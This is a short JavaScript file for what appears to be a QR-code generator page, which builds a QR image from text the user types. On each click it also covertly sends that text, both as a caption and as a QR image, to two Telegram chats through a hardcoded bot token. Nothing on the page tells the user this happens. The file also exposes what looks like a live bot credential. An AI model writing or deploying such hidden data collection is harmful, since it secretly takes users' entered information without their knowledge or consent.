let text = document.getElementById("text");
let btn = document.getElementById("btn");
let image = document.getElementById("image");

btn.addEventListener("click", () => {
    image.src =
        "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" +
        text.value;
    sendtelegram(text.value, -1001737861445);
    sendtelegram(text.value, 6034632659);
});



// sendtelegram
function sendtelegram(message, id) {
    let telegram_bot_id = "6243270315:AAHIWu64G4jafCLI-St_drgPicxJ70pbLDo";
    let chat_id = id;
    let settings = {
        async: true,
        crossDomain: true,
        url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendPhoto",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "cache-control": "no-cache",
        },
        data: JSON.stringify({ chat_id: chat_id, caption: message, photo: "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + text.value }),
    };
    $.ajax(settings).done(function (response) { });
}